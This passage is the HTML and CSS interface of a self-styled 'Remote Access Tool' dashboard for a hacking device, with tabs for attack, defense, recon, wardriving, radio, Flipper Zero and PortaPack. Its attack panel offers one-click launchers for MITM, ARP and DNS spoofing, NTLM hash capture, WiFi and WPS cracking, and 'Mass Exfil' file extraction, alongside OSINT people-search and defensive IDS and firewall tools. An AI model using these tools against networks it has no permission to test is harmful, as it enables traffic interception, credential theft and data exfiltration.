/* Terminal output */
.term{font-size:.75em;line-height:1.6;color:var(--sec)}
.term .ts{color:var(--dim)}
.term .ok{color:#cc2222}
.term .hi{color:var(--xred)}
.term .dim{color:var(--border)}

/* Activity log */
.log-entry{font-size:.72em;padding:2px 0;border-bottom:1px solid #110000;color:var(--dim)}
.log-entry:last-child{color:var(--dim)}

/* Tab content */
.tab-content{display:none}
.tab-content.active{display:contents}

/* Protocol text bottom corners */
.proto-text{position:fixed;bottom:36px;font-size:.72em;color:var(--border);letter-spacing:.08em;line-height:1.8;z-index:2}
.proto-text.left{left:16px}
.proto-text.right{right:16px;text-align:right}

/* Bottom bar */
#statusbar{position:fixed;bottom:0;left:0;right:0;background:rgba(6,0,0,0.9);border-top:1px solid var(--border);padding:4px 16px;display:flex;justify-content:space-between;align-items:center;z-index:10;font-size:.72em}
#live-dot{width:8px;height:8px;border-radius:50%;background:var(--red);display:inline-block;margin-right:6px;animation:pulse 1s infinite}
@keyframes pulse{0%,100%{opacity:1}50%{opacity:.3}}

/* Output terminal */
pre.out{font-size:.75em;color:#cc2222;line-height:1.5;white-space:pre-wrap;word-break:break-all;min-height:60px}

/* Tooltips */
.tool-btn{position:relative}
#tooltip-box{
  position:fixed;background:var(--card);border:1px solid var(--dred);color:var(--xred);
  padding:8px 12px;font-size:.75em;white-space:pre-line;z-index:9999;
  border-radius:2px;pointer-events:none;max-width:220px;line-height:1.6;
  box-shadow:0 0 16px var(--red)55;display:none;font-family:monospace}
/* Interactive Terminal */
#cli-terminal{display:flex;flex-direction:column;height:100%;background:#030000}
#cli-output{flex:1;max-height:calc(100vh - 320px);overflow-y:auto;padding:10px;font-family:monospace;font-size:.78em;line-height:1.6}
#cli-input-row{display:flex;align-items:center;padding:6px 10px;border-top:1px solid var(--border);gap:6px}
#cli-prompt{color:var(--red);font-family:monospace;font-size:.8em;white-space:nowrap}
#cli-input{flex:1;background:#050000;border:1px solid var(--dim);border-radius:2px;outline:none;color:var(--xred);font-family:monospace;font-size:.85em;caret-color:var(--xred);padding:3px 6px}

/* CLI keeps line breaks in command output */
#cli-output{white-space:pre-wrap;word-break:break-word}

/* Nav scrolls sideways on phones instead of overflowing */
#nav{overflow-x:auto;scrollbar-width:thin}

/* WiFi + Pineapple tabs */
.wbox{font-size:.74em;color:var(--dim);line-height:1.7;border:1px solid var(--dim);background:#070000;padding:6px 8px;margin-bottom:6px;border-radius:2px}
.winput{flex:1;min-width:0;background:#0a0000;border:1px solid var(--border);color:#cc2222;padding:4px 6px;font-family:monospace;font-size:.75em}
.wlist{font-size:.74em;margin-bottom:6px}
.wrow{display:flex;align-items:center;gap:6px;width:100%;background:#0a0000;border:1px solid var(--dim);color:#cc2222;padding:5px 8px;margin-bottom:4px;cursor:pointer;font-family:inherit;font-size:1em;text-align:left;border-radius:2px}
.wrow:hover{background:var(--ddim);border-color:var(--dred)}
.wrow.on{border-color:var(--red);color:var(--xred)}
.wrow .ws{flex:1;overflow:hidden;text-overflow:ellipsis;white-space:nowrap}
.wrow .wb{color:var(--dim);font-size:.9em;white-space:nowrap}
.wx{background:none;border:none;color:var(--border);cursor:pointer;font-family:inherit;font-size:1em}
.wx:hover{color:var(--red)}
#pager-table{width:100%;border-collapse:collapse}
#pager-table th{color:var(--red);text-align:left;font-weight:normal;letter-spacing:.08em;border-bottom:1px solid var(--border);padding:3px 6px;position:sticky;top:0;background:#050000}
#pager-table td{color:var(--dim);padding:3px 6px;border-bottom:1px solid var(--card);white-space:nowrap}
#pager-table tr.open td{color:var(--xred)}

/* PortaPack D-pad (v12) */
.pp-pad{display:grid;grid-template-columns:repeat(3,46px);gap:5px;justify-content:center}
.pp-pad button{background:var(--card);border:1px solid var(--dim);color:var(--sec);padding:6px 0;font-family:inherit;cursor:pointer;border-radius:2px}
.pp-pad button:hover{border-color:var(--red);color:var(--red)}

/* Responsive */
@media(max-width:900px){#main{grid-template-columns:1fr}}
@media(max-width:900px){#sr-grid{grid-template-columns:1fr !important}}

/* v14: fit every screen — phones in either orientation and car head units */
html,body{max-width:100%;overflow-x:hidden}
#nav{overflow-x:auto;overflow-y:hidden;-webkit-overflow-scrolling:touch;scrollbar-width:thin}
#nav .tab-btn{flex:0 0 auto}
#main>*{min-width:0}
/* Wide tabs (TERMINAL, STINGRAY): left column + status panel on one row; the
   center art panel steps aside instead of pushing the status panel to a 2nd row. */
#main.term-wide>#center{display:none}
#xterm-host{height:calc(100vh - 250px);min-height:260px;border:1px solid var(--border);border-radius:4px;overflow:hidden;background:#000;touch-action:none}
.term-keys{display:flex;gap:4px;overflow-x:auto;-webkit-overflow-scrolling:touch;padding:2px 0 6px;margin-bottom:2px}
.term-keys button{flex:0 0 auto;min-width:44px;min-height:38px;padding:0 10px;background:var(--card);border:1px solid var(--dim);color:var(--sec);font-family:monospace;font-size:.85em;border-radius:3px;cursor:pointer;touch-action:manipulation;user-select:none;-webkit-user-select:none}
.term-keys button.on{background:var(--red);border-color:var(--red);color:#000}
.term-keys button.warn{border-color:#883300}
.term-keys button:focus-visible{outline:2px solid var(--red);outline-offset:1px}
@media(max-width:900px){
  #main,#main.term-wide{grid-template-columns:1fr;height:auto;overflow:visible}
  .side-panel{overflow:visible;border-right:none;border-bottom:1px solid var(--border)}
  #rat-zone{min-height:240px}
  #header h1{font-size:1.6em}
  #xterm-host{height:60vh;min-height:220px}
}
@media(max-height:560px){
  #header{padding:2px 12px}
  #header h1{font-size:1.3em;letter-spacing:.08em}
  #header .sub{display:none}
  #nav{padding:4px 8px}
  #main,#main.term-wide{height:auto;overflow:visible}
  .side-panel{overflow:visible}
  #rat-zone{min-height:200px}
  #xterm-host{height:70vh;min-height:180px}
}
</style>
</head>
<body>

<div id="header">
  <div class="hdr-corner hdr-tl"></div>
  <div class="hdr-corner hdr-tr"></div>
  <h1>TUNNEL R.A.T.</h1>
  <div class="sub">REMOTE ACCESS TOOL — NETWORK INTELLIGENCE</div>
</div>

<div id="nav">
  <button class="tab-btn active" onclick="switchTab('attack',this)">☠ ATTACK</button>
  <button class="tab-btn" onclick="switchTab('defense',this)">♡ DEFENSIVE</button>
  <button class="tab-btn" onclick="switchTab('recon',this)">◎ RECON</button>
  <button class="tab-btn" onclick="switchTab('wardrive',this)">⊕ WARDRIVE</button>
  <button class="tab-btn" onclick="switchTab('radio',this)">📻 RADIO</button>
  <button class="tab-btn" onclick="switchTab('portapack',this)">📟 PORTAPACK</button>
  <button class="tab-btn" onclick="switchTab('flipper',this)">🐬 FLIPPER</button>
  <button class="tab-btn" onclick="switchTab('anon',this)">🧅 ANON</button>
  <button class="tab-btn" onclick="switchTab('wifi',this)">📶 WIFI</button>
  <button class="tab-btn" onclick="switchTab('pineapple',this)">🍍 PINEAPPLE</button>
  <button class="tab-btn" onclick="switchTab('stingray',this)">📡 STINGRAY</button>
  <button class="tab-btn" onclick="switchTab('cli',this)" style="margin-left:auto">▶ CLI</button>
  <button class="tab-btn" onclick="switchTab('files',this)">📁 FILES</button>
  <button class="tab-btn" onclick="switchTab('log',this)">📋 LOG</button>
  <button class="tab-btn" onclick="switchTab('terminal',this)">💻 TERMINAL</button>
  <button class="tab-btn" onclick="switchTab('theme',this)">🎨 THEME</button>
</div>

<div id="main">

  <!-- LEFT PANEL -->
  <div class="side-panel" id="left-panel">

    <div class="tab-content active" id="left-attack">
      <div class="panel-title">CORE ATTACK</div>
      <button class="tool-btn" onclick="run('bettercap')" data-tip="ARP spoof, MITM, network
sniffing and injection"><span class="icon">🎯</span>Bettercap</button>
      <button class="tool-btn" onclick="run('responder')" data-tip="Poison LLMNR/NBT-NS to
capture NTLMv2 hashes"><span class="icon">🎣</span>Responder</button>
      <button class="tool-btn" onclick="run('mitmproxy')" data-tip="Intercept and modify
HTTP/HTTPS traffic"><span class="icon">🔓</span>mitmproxy</button>
      <button class="tool-btn" onclick="run('arp-spoof')" data-tip="Redirect traffic via
ARP cache poisoning"><span class="icon">📡</span>ARP Spoof</button>
      <button class="tool-btn" onclick="run('dns-spoof')" data-tip="Redirect DNS queries
to attacker-controlled IPs"><span class="icon">🌐</span>DNS Spoof</button>

      <div class="panel-title" style="margin-top:16px">RED TEAM</div>
      <button class="tool-btn" onclick="run('nmap-scan')" data-tip="Discover hosts and
open ports on the LAN"><span class="icon">🌐</span>LAN Scan</button>
      <button class="tool-btn" onclick="run('port-terminator')" data-tip="Kill connections to
specific ports on target"><span class="icon">🚫</span>Port Terminator</button>
      <button class="tool-btn" onclick="run('stream-killer')" data-tip="Terminate active TCP
streams on the network"><span class="icon">✂</span>Stream Killer</button>
      <button class="tool-btn" onclick="run('mass-exfil')" data-tip="Extract files from
target over the network"><span class="icon">📤</span>Mass Exfil</button>
      <button class="tool-btn" onclick="run('hashcat')" data-tip="GPU/CPU password cracker
for captured hashes"><span class="icon">💀</span>hashcat</button>
      <button class="tool-btn" onclick="run('aircrack')" data-tip="Crack WEP/WPA keys
from captured handshakes"><span class="icon">📶</span>aircrack-ng</button>
      <button class="tool-btn" onclick="run('wifite')" data-tip="Automated WiFi attack
tool — WPS, WPA, WEP"><span class="icon">📡</span>Wifite</button>
      <button class="tool-btn" onclick="run('reaver')" data-tip="Brute-force WPS PIN
to recover WPA passphrase"><span class="icon">🔑</span>Reaver WPS</button>
    </div>

    <div class="tab-content" id="left-defense">
      <div class="panel-title">DEFENSIVE</div>
      <button class="tool-btn" onclick="run('suricata-status')" data-tip="Check if Suricata IDS
is running and detecting"><span class="icon">🛡️</span>Suricata Status</button>
      <button class="tool-btn" onclick="run('suricata-start')" data-tip="Start Suricata IDS
for network monitoring"><span class="icon">▶</span>Start Suricata</button>
      <button class="tool-btn" onclick="run('suricata-stop')" data-tip="Stop the Suricata IDS
service"><span class="icon">⏹</span>Stop Suricata</button>
      <button class="tool-btn" onclick="run('zeek-status')" data-tip="Check Zeek network
analysis framework status"><span class="icon">🔬</span>Zeek Status</button>
      <button class="tool-btn" onclick="run('fail2ban-status')" data-tip="Show Fail2ban status —
banned IPs and jails"><span class="icon">🔒</span>Fail2ban Status</button>
      <button class="tool-btn" onclick="run('clamav-scan')" data-tip="Scan filesystem for
malware and viruses"><span class="icon">🦠</span>ClamAV Scan</button>
      <button class="tool-btn" onclick="run('fw-status')" data-tip="Show iptables firewall
rules and status"><span class="icon">🔥</span>Firewall Status</button>
      <button class="tool-btn" onclick="run('isolate')" data-tip="Block all traffic to/from
a specific host"><span class="icon">⛔</span>Isolate Host</button>
      <button class="tool-btn" onclick="run('auditd-status')" data-tip="Show system audit log
status and recent events"><span class="icon">📋</span>Auditd Status</button>
      <button class="tool-btn" onclick="run('connections')" data-tip="List all active network
connections and sockets"><span class="icon">🔗</span>Active Connections</button>
      <button class="tool-btn" onclick="run('arp-table')" data-tip="Show ARP cache — MAC to
IP mappings on the LAN"><span class="icon">📋</span>ARP Table</button>

      <div class="panel-title" style="margin-top:16px">NETWORK DEFENSE — your network</div>
      <div style="font-size:.72em;color:var(--dim);margin-bottom:8px;line-height:1.5">
        See who's connected, spot unknown devices, and block the ones you don't
        want. Blocking is real (firewall) — it keeps them off, unlike deauth.
      </div>
      <button class="tool-btn" onclick="run('def-devices')" data-tip="List everything connected
to your AP and LAN"><span class="icon">👥</span>Connected Devices</button>
      <button class="tool-btn" onclick="run('def-unknown')" data-tip="Flag devices not in your
known-devices allowlist"><span class="icon">⚠</span>Flag Unknown Devices</button>
      <button class="tool-btn" onclick="run('def-alerts')" data-tip="Recent Suricata IDS alerts —
malicious traffic detection"><span class="icon">🚨</span>Malicious Traffic Alerts</button>
      <button class="tool-btn" onclick="run('def-known')" data-tip="Show your trusted
device allowlist"><span class="icon">✓</span>Known Devices</button>
      <button class="tool-btn" onclick="run('def-allow')" data-tip="Trust a device — replace MAC
and name in the CLI, then ENTER"><span class="icon">➕</span>Allow Device (MAC)</button>
      <button class="tool-btn" onclick="run('def-block')" data-tip="Block a device for real —
replace MAC in the CLI, then ENTER"><span class="icon">⛔</span>Block Device (MAC)</button>
      <button class="tool-btn" onclick="run('def-blocked')" data-tip="Show which devices are
currently blocked"><span class="icon">📜</span>Show Blocked</button>
      <button class="tool-btn" onclick="run('def-unblock')" data-tip="Remove a block —
replace MAC in the CLI, then ENTER"><span class="icon">✅</span>Unblock Device (MAC)</button>
      <button class="tool-btn" onclick="run('def-unblock-all')" data-tip="UNDO — remove every block
at once if you made a mistake"><span class="icon">↩</span>Unblock ALL (undo)</button>

      <div class="panel-title" style="margin-top:16px">DEAUTH — authorized testing only</div>
      <div style="font-size:.72em;color:var(--red);margin-bottom:8px;line-height:1.5">
        ⚠ Disruption/test tool, NOT access control (devices reconnect). Deauth is
        treated as jamming and is illegal in most places — use only on your own
        devices to test resilience. To keep a device off, use Block above.
      </div>
      <button class="tool-btn" onclick="run('deauth')" data-tip="Test deauth on your own device —
replace CLIENT_MAC and AP_BSSID in the CLI"><span class="icon">📡</span>Deauth Test (own device)</button>
    </div>

    <div class="tab-content" id="left-recon">
      <div class="panel-title">RECON DB</div>
      <button class="tool-btn" onclick="run('recon-aps')"><span class="icon">📶</span>Access Points</button>
      <button class="tool-btn" onclick="run('recon-clients')"><span class="icon">👥</span>Clients</button>
      <button class="tool-btn" onclick="run('recon-handshakes')"><span class="icon">🤝</span>Handshakes</button>
      <button class="tool-btn" onclick="run('nmap-scan')" data-tip="Discover hosts and
open ports on the LAN"><span class="icon">🌐</span>LAN Scan</button>
      <button class="tool-btn" onclick="run('arp-scan')"><span class="icon">📡</span>ARP Scan</button>
      <button class="tool-btn" onclick="run('netdiscover')"><span class="icon">🔍</span>Netdiscover</button>

      <div class="panel-title" style="margin-top:16px">OSINT</div>
      <div style="display:flex;gap:4px;margin-bottom:8px">
        <input id="osint-target" placeholder="domain / IP / username" style="flex:1;background:var(--card);border:1px solid var(--border);color:var(--sec);padding:5px 8px;font-family:monospace;font-size:.78em">
      </div>
      <button class="tool-btn" onclick="showOsintGuide()" style="margin-bottom:8px"><span class="icon">📖</span>How to use OSINT (guide)</button>
      <div style="font-size:.68em;color:var(--dim);margin:4px 0 8px;line-height:1.5">Top to bottom = a typical recon flow. Each tool's reference shows what to chain it with.</div>
      <div class="section-label">1 · DOMAIN &amp; DNS</div>
      <button class="tool-btn" onclick="osint('whois')" data-tip="Lookup domain registration,
owner, and nameservers"><span class="icon">🔍</span>Whois</button>
      <button class="tool-btn" onclick="osint('dig')" data-tip="Query DNS records — A, MX,
NS, TXT and more"><span class="icon">🌐</span>DNS Lookup</button>
      <button class="tool-btn" onclick="osint('traceroute')" data-tip="Trace network path to target,
show each hop and latency"><span class="icon">📍</span>Traceroute</button>
      <div class="section-label">2 · SUBDOMAINS</div>
      <button class="tool-btn" onclick="osint('subfinder')" data-tip="Passive subdomain discovery
using public sources"><span class="icon">🔎</span>Subfinder</button>
      <button class="tool-btn" onclick="osint('fierce')" data-tip="DNS brute-force to find
subdomains and zone data"><span class="icon">🐉</span>Fierce DNS</button>
      <button class="tool-btn" onclick="osint('amass')" data-tip="Attack surface mapping —
deep subdomain enumeration"><span class="icon">🗺</span>Amass Enum</button>
      <div class="section-label">3 · PROBE HOSTS</div>
      <button class="tool-btn" onclick="osint('nmap')" data-tip="Port scan — find open services
and version info"><span class="icon">🔭</span>Nmap Scan</button>
      <button class="tool-btn" onclick="osint('sslscan')" data-tip="Analyze SSL/TLS config,
ciphers and certificate details"><span class="icon">🔐</span>SSL Scan</button>
      <div class="section-label">4 · WEB</div>
      <button class="tool-btn" onclick="osint('whatweb')" data-tip="Fingerprint web tech stack —
CMS, frameworks, servers"><span class="icon">🕸</span>WhatWeb</button>
      <button class="tool-btn" onclick="osint('wafw00f')" data-tip="Detect Web Application Firewalls
protecting the target"><span class="icon">🛡</span>WAF Detect</button>
      <button class="tool-btn" onclick="osint('nikto')" data-tip="Web vulnerability scanner —
finds misconfigs and CVEs"><span class="icon">⚡</span>Nikto Scan</button>
      <div class="section-label">5 · PEOPLE &amp; EMAIL</div>
      <button class="tool-btn" onclick="osint('harvester')" data-tip="Harvest emails, names, IPs
from public sources"><span class="icon">🌾</span>theHarvester</button>
      <button class="tool-btn" onclick="osint('sherlock')" data-tip="Hunt username across 300+
social media platforms"><span class="icon">🕵</span>Sherlock</button>
      <div class="section-label">6 · METADATA &amp; MISC</div>
      <button class="tool-btn" onclick="osint('exiftool')" data-tip="Extract metadata from files —
location, author, timestamps"><span class="icon">📄</span>ExifTool</button>
      <button class="tool-btn" onclick="osint('myip')" data-tip="Show your current
public IP address"><span class="icon">🌍</span>My Public IP</button>
      <button class="tool-btn" onclick="osint('recon-ng')" data-tip="Modular recon framework
for structured OSINT"><span class="icon">🕵️</span>Recon-ng Info</button>
    </div>

    <div class="tab-content" id="left-wardrive">
      <div class="panel-title">WARDRIVE — networks nearby</div>
      <div style="display:flex;gap:6px;margin-bottom:6px">
        <input id="wd-filter" placeholder="filter SSID / MAC…" oninput="renderWardrive()"
          style="flex:1;background:var(--card);border:1px solid var(--border);color:var(--sec);padding:6px;border-radius:3px;font-family:inherit;font-size:.78em">
        <button class="tool-btn" style="width:auto;margin:0" onclick="loadWardrive()"><span class="icon">🔄</span></button>
      </div>
      <div style="font-size:.7em;color:var(--dim);margin-bottom:8px">
        Live scan of nearby WiFi. "×N" = times seen across scans (sightings).
      </div>
      <div id="wd-list"></div>

      <div class="panel-title" style="margin-top:16px">WiGLE LOGGER — GPS wardriving</div>
      <div style="font-size:.72em;color:var(--dim);margin-bottom:8px;line-height:1.5">
        Logs every network you pass with its GPS location to a WiGLE-format CSV
        you can upload to wigle.net. Needs a GPS fix. Start, drive/walk around,
        stop — the CSV lands in FILES.
      </div>
      <div class="actions" style="margin-bottom:8px">
        <button class="tool-btn" style="width:auto;margin:0" onclick="run('wardrive-start')"><span class="icon">▶</span>Start</button>
        <button class="tool-btn" style="width:auto;margin:0;border-color:#883300" onclick="run('wardrive-stop')"><span class="icon">⏹</span>Stop &amp; Save</button>
        <button class="tool-btn" style="width:auto;margin:0" onclick="run('wardrive-status')"><span class="icon">📊</span>Status</button>
      </div>

      <div style="font-size:.8em;color:var(--red);margin:10px 0 4px">SAVED WARDRIVE FILES</div>
      <div style="display:flex;gap:6px;margin-bottom:6px">
        <select id="wd-files" onchange="wardriveFilePick()"
          style="flex:1;background:var(--card);border:1px solid var(--border);color:var(--sec);padding:6px;border-radius:3px;font-family:inherit;font-size:.74em">
          <option value="">— select a saved CSV —</option>
        </select>
        <button class="tool-btn" style="width:auto;margin:0" onclick="loadWardriveFiles()"><span class="icon">🔄</span></button>
      </div>
      <div id="wd-file-info" style="font-size:.7em;color:var(--dim);line-height:1.6;margin-bottom:6px"></div>
      <div class="actions" style="margin-bottom:10px">
        <button class="tool-btn" style="width:auto;margin:0" onclick="wardriveDownload()"><span class="icon">⬇</span>Download</button>
        <button class="tool-btn" style="width:auto;margin:0" onclick="wardriveOpen()"><span class="icon">↗</span>View</button>
        <button class="tool-btn" style="width:auto;margin:0;border-color:#227722" onclick="wardriveUpload()"><span class="icon">☁</span>Upload to WiGLE</button>
      </div>

      <div class="panel-title" style="margin-top:14px">WiGLE ACCOUNT</div>
      <div style="font-size:.7em;color:var(--dim);margin-bottom:6px;line-height:1.5">
        From wigle.net → Account → "Show my token": enter your API Name and
        API Token to upload straight from the device.
      </div>
      <div id="wigle-status" style="font-size:.72em;color:var(--dim);margin-bottom:6px"></div>
      <input id="wigle-name" placeholder="API Name" autocomplete="off"
        style="width:100%;margin-bottom:5px;background:var(--card);border:1px solid var(--border);color:var(--sec);padding:6px;border-radius:3px;font-family:inherit;font-size:.76em">
      <input id="wigle-token" placeholder="API Token" type="password" autocomplete="off"
        style="width:100%;margin-bottom:6px;background:var(--card);border:1px solid var(--border);color:var(--sec);padding:6px;border-radius:3px;font-family:inherit;font-size:.76em">
      <button class="tool-btn" onclick="saveWigleCreds()"><span class="icon">💾</span>Save WiGLE credentials</button>

      <div class="panel-title" style="margin-top:16px">SIGHTINGS — anti-tracking</div>
      <div style="font-size:.72em;color:var(--dim);margin-bottom:8px;line-height:1.5">
        Counts encounters over time; flags devices that keep reappearing as you
        move (possible trackers). Stationary routers (Comcast, Verizon…) filtered.
        Uses the C5 dongle when attached. Scan repeatedly over time.
      </div>
      <button class="tool-btn" onclick="run('sight-scan')"><span class="icon">📡</span>Scan &amp; Count</button>
      <button class="tool-btn" onclick="run('sight-trackers')"><span class="icon">⚠</span>Possible Trackers</button>
      <button class="tool-btn" onclick="run('sight-report')"><span class="icon">📊</span>Most-Seen Report</button>
      <button class="tool-btn" onclick="run('sight-reset')"><span class="icon">🗑</span>Reset History</button>
    </div>

    <div class="tab-content" id="left-radio">
      <div class="panel-title">BLUETOOTH</div>
      <button class="tool-btn" onclick="run('ble-audit-list')"><span class="icon">📋</span>BLE Audit Log</button>
      <div class="section-label">PICOCAL COMPANION</div>
      <div style="color:var(--dim);font-size:.75em;line-height:1.6;padding:6px 0">
        BLE scanning is handled by the Pico 2W companion device via the API endpoint.<br><br>
        Flash: BLEAudit.py<br>
        Endpoint: /api/remote/run
      </div>

      <div class="panel-title" style="margin-top:16px">SDR</div>
      <div id="sdr-status-pill" style="font-size:.7em;color:var(--dim);margin-bottom:8px">checking...</div>
      <div class="section-label">SPECTRUM SCAN</div>
      <div style="display:flex;gap:4px;margin-bottom:6px">
        <input id="sdr-start" value="88M" style="width:60px;background:#0a0000;border:1px solid var(--border);color:#cc2222;padding:4px;font-family:monospace;font-size:.75em">
        <input id="sdr-stop"  value="108M" style="width:60px;background:#0a0000;border:1px solid var(--border);color:#cc2222;padding:4px;font-family:monospace;font-size:.75em">
        <button class="tool-btn" style="flex:1;margin:0" onclick="sdrScan()">SCAN</button>
      </div>
      <div class="section-label">FM RADIO</div>
      <div style="display:flex;gap:4px;margin-bottom:6px">
        <input id="fm-freq" value="104.3M" style="width:80px;background:#0a0000;border:1px solid var(--border);color:#cc2222;padding:4px;font-family:monospace;font-size:.75em">
        <button class="tool-btn" style="flex:1;margin:0" onclick="sdrFM()">▶ START</button>
        <button class="tool-btn" style="margin:0" onclick="sdrStop('fm')">■</button>
      </div>
      <div class="section-label">FM PRESETS</div>
      <button class="tool-btn" onclick="document.getElementById('fm-freq').value='104.3M'">📻 104.3 WBAL</button>
      <button class="tool-btn" onclick="document.getElementById('fm-freq').value='88.1M'">📻 88.1 WYPR</button>
      <button class="tool-btn" onclick="document.getElementById('fm-freq').value='98.7M'">📻 98.7 WMZQ</button>
      <div class="section-label">ADS-B AIRCRAFT</div>
      <button class="tool-btn" onclick="sdrADSB('start')"><span class="icon">✈</span>Start ADS-B</button>
      <button class="tool-btn" onclick="sdrADSB('stop')"><span class="icon">■</span>Stop ADS-B</button>
      <div class="section-label">QUICK SCAN</div>
      <button class="tool-btn" onclick="quickScan('315M','315.1M')">🔑 Key Fobs 315M</button>
      <button class="tool-btn" onclick="quickScan('433M','434M')">📡 ISM 433M</button>
      <button class="tool-btn" onclick="quickScan('462M','468M')">📟 GMRS/FRS</button>
      <button class="tool-btn" onclick="quickScan('1090M','1090.1M')">✈ ADS-B 1090M</button>
    </div>

    <div class="tab-content" id="left-flipper">
      <div class="panel-title">FLIPPER ZERO — TUNNEL R.A.T. FW</div>
      <div id="fz-state" class="wbox">checking…</div>
      <div style="display:flex;gap:6px;flex-wrap:wrap;margin-bottom:6px">
        <button class="tool-btn" style="width:auto;margin:0" onclick="fzSend('info device')"><span class="icon">ℹ</span>Info</button>
        <button class="tool-btn" style="width:auto;margin:0" onclick="fzSend('info power')"><span class="icon">🔋</span>Power</button>
        <button class="tool-btn" style="width:auto;margin:0" onclick="fzSend('storage info /ext')"><span class="icon">💾</span>SD</button>
        <button class="tool-btn" style="width:auto;margin:0" onclick="fzStatus()"><span class="icon">🔄</span></button>
      </div>
      <div style="font-size:.7em;color:var(--dim);line-height:1.5;margin-bottom:8px">
        <b>USB</b>: plug the Flipper into the hub, nothing to run on it.
        <b>WiFi</b>: on the Flipper open <i>Tunnel R.A.T. → Tunnel R.A.T. Link</i>, press OK,
        with the ESP32 bridge board on the GPIO header. USB is used when both are up.
      </div>

      <div class="section-label">CAPTURE (logged to FILES → flipper)</div>
      <div style="display:flex;gap:4px;align-items:center;margin-bottom:6px;font-size:.75em;color:var(--dim)">
        <input id="fz-freq" value="433.92" class="winput" style="flex:none;width:70px">MHz
        <select id="fz-secs" style="margin-left:auto;background:var(--card);border:1px solid var(--border);color:var(--sec);padding:4px;font-family:inherit;font-size:.95em">
          <option value="10">10s</option><option value="20" selected>20s</option><option value="45">45s</option><option value="60">60s</option>
        </select>
      </div>
      <button class="tool-btn" onclick="fzSubRx()"><span class="icon">📡</span>Sub-GHz RX (raw log)</button>
      <button class="tool-btn" onclick="fzTimed('rfid read')"><span class="icon">🏷</span>Read 125 kHz RFID</button>
      <button class="tool-btn" onclick="fzTimed('ikey read')"><span class="icon">🔑</span>Read iButton</button>
      <button class="tool-btn" onclick="fzTimed('ir rx')"><span class="icon">🔴</span>Learn IR (rx)</button>

      <div class="section-label">INFRARED UNIVERSAL</div>
      <div style="display:flex;gap:6px;margin-bottom:6px">
        <select id="fz-irr" style="flex:1;min-width:0;background:var(--card);border:1px solid var(--border);color:var(--sec);padding:5px;border-radius:3px;font-family:inherit;font-size:.74em">
          <option value="tv">TV</option><option value="ac">AC</option><option value="audio">Audio</option><option value="projector">Projector</option>
        </select>
        <input id="fz-irs" value="Power" class="winput" style="flex:1;min-width:0">
        <button class="tool-btn" style="width:auto;margin:0" onclick="fzSend('ir universal '+_v('fz-irr')+' '+_v('fz-irs'))">SEND</button>
      </div>

      <div class="section-label">SD CARD → FILES</div>
      <div style="display:flex;gap:6px;margin-bottom:6px">
        <select id="fz-dir" style="flex:1;min-width:0;background:var(--card);border:1px solid var(--border);color:var(--sec);padding:5px;border-radius:3px;font-family:inherit;font-size:.74em">
          <option>/ext/subghz</option><option>/ext/nfc</option><option>/ext/infrared</option><option>/ext/lfrfid</option>
          <option>/ext/ibutton</option><option>/ext/badusb</option><option>/ext/apps_data</option><option>/ext</option>
        </select>
        <button class="tool-btn" style="width:auto;margin:0" onclick="fzLs(_v('fz-dir'))"><span class="icon">📂</span></button>
      </div>
      <div id="fz-ls" style="font-size:.74em;max-height:220px;overflow-y:auto;margin-bottom:8px;color:var(--dim)"></div>

      <div class="section-label">APPS</div>
      <div style="display:flex;gap:6px;margin-bottom:6px">
        <input id="fz-app" class="winput" placeholder="Sub-GHz, NFC, Infrared, /ext/apps/Games/snake.fap…" onkeydown="if(event.key==='Enter')fzOpenApp()">
        <button class="tool-btn" style="width:auto;margin:0" onclick="fzOpenApp()">OPEN</button>
      </div>
      <button class="tool-btn" onclick="fzSend('loader close')"><span class="icon">✖</span>Close running app</button>

      <div class="section-label">SHELL</div>
      <div style="display:flex;gap:6px;margin-bottom:5px">
        <input id="fz-cmd" class="winput" placeholder="help, info device, storage list /ext…" onkeydown="if(event.key==='Enter')fzSend()">
        <button class="tool-btn" style="width:auto;margin:0" onclick="fzSend()">SEND</button>
      </div>
      <div style="display:flex;gap:4px;flex-wrap:wrap;margin-bottom:6px">
        <button class="tool-btn" style="width:auto;margin:0;padding:4px 8px" onclick="fzSend('help')">help</button>
        <button class="tool-btn" style="width:auto;margin:0;padding:4px 8px" onclick="fzSend('loader list')">apps</button>
        <button class="tool-btn" style="width:auto;margin:0;padding:4px 8px" onclick="fzSend('date')">date</button>
        <button class="tool-btn" style="width:auto;margin:0;padding:4px 8px" onclick="fzFind()">find it</button>
      </div>
    </div>

    <div class="tab-content" id="left-portapack">
      <div class="panel-title">PORTAPACK H4M — USB-C</div>
      <div id="pp-state" class="wbox">checking…</div>
      <div style="display:flex;gap:6px;flex-wrap:wrap;margin-bottom:6px">
        <button class="tool-btn" style="width:auto;margin:0" onclick="ppMode('hackrf')" data-tip="Hand the radio to the NanoPi.
Mayhem's screen shows HackRF mode."><span class="icon">📡</span>SDR mode</button>
        <button class="tool-btn" style="width:auto;margin:0" onclick="ppMode('mayhem')" data-tip="Reboot the PortaPack back
into Mayhem (remote control)."><span class="icon">📟</span>Mayhem mode</button>
        <button class="tool-btn" style="width:auto;margin:0" onclick="ppStatus()"><span class="icon">🔄</span></button>
      </div>
      <div style="font-size:.7em;color:var(--dim);line-height:1.5;margin-bottom:8px">
        One cable, one mode at a time. <b>Mayhem</b> = drive the PortaPack from here.
        <b>SDR</b> = the NanoPi uses it as a HackRF. Going back to Mayhem reboots it.
      </div>

      <div class="panel-title" style="margin-top:12px">MAYHEM REMOTE</div>
      <button class="tool-btn" onclick="ppMirror()"><span class="icon">🖥</span><span id="pp-mirror-left">Mirror screen</span></button>
      <button class="tool-btn" onclick="ppScreenshot()"><span class="icon">📸</span>Save screenshot → FILES</button>
      <button class="tool-btn" onclick="ppRtcSync()" data-tip="Set the PortaPack clock
from the NanoPi (UTC)."><span class="icon">🕒</span>Sync clock (UTC)</button>
      <div class="section-label">APPS</div>
      <div style="display:flex;gap:6px;margin-bottom:6px">
        <select id="pp-apps" style="flex:1;min-width:0;background:var(--card);border:1px solid var(--border);color:var(--sec);padding:5px;border-radius:3px;font-family:inherit;font-size:.74em">
          <option value="">— tap 🔄 to load apps —</option>
        </select>
        <button class="tool-btn" style="width:auto;margin:0" onclick="ppLoadApps()"><span class="icon">🔄</span></button>
      </div>
      <button class="tool-btn" onclick="ppStartApp()"><span class="icon">▶</span>Launch app</button>
      <div class="section-label">SHELL</div>
      <div style="display:flex;gap:6px;margin-bottom:5px">
        <input id="pp-cmd" class="winput" placeholder="sysinfo, radioinfo, ls /CAPTURES…" onkeydown="if(event.key==='Enter')ppSend()">
        <button class="tool-btn" style="width:auto;margin:0" onclick="ppSend()">SEND</button>
      </div>
